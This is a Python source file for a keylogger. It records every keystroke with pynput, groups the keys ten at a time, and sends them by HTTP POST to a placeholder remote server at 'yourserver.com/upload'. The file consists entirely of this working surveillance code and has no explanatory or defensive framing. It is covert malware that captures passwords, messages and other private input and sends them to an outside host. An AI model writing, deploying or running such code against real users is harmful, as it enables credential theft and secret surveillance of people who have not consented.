import logging
import pynput
from pynput.keyboard import Key, Listener
import datetime
import time
import requests
import os

class KeystrokeRecorder:
    def __init__(self):
        self.unix_time = int(time.mktime(datetime.datetime.now().timetuple()))
        self.count, self.keys = 0, []
        
        # Use environment variable for log filename or fallback to default
        log_filename = os.getenv("KEY_LOG_FILENAME", f"log_{self.unix_time}.txt")
        
        logging.basicConfig(
            filename=log_filename,
            level=logging.INFO,
            format="%(message)s",
        )

    def send_logs(self, log_data):
        """Send log data to a remote server."""
        try:
            response = requests.post("http://yourserver.com/upload", json=log_data)
            if response.status_code == 200:
                logging.info("Logs sent successfully.")
            else:
                logging.error("Failed to send logs.")
        except requests.RequestException as e:
            logging.error(f"Error sending logs: {e}")

    def on_press(self, key):
        """Record keystrokes to a log file."""
        self.keys.append(key)
        self.count += 1

        if self.count >= 10:
            self.count = 0
            self.write_file()
            self.keys = []

    def write_file(self):
        """Save the keystrokes to a log file and send to server."""
        log_data = []
        for key in self.keys:
            k = str(key).replace("'", "")
            if k == "space":
                log_data.append(" ")
            elif k.startswith("Key"):
                log_data.append(k.split('.')[1])
            else:
                log_data.append(k)

        # Send the logs to the server
        self.send_logs({"logs": log_data})

    def on_release(self, key):
        """Kill the program on hitting the Esc button."""
        if key == Key.esc:
            return False

if __name__ == "__main__":
    recorder = KeystrokeRecorder()
    with Listener(
        on_press=recorder.on_press, on_release=recorder.on_release
    ) as listener:
        listener.join()
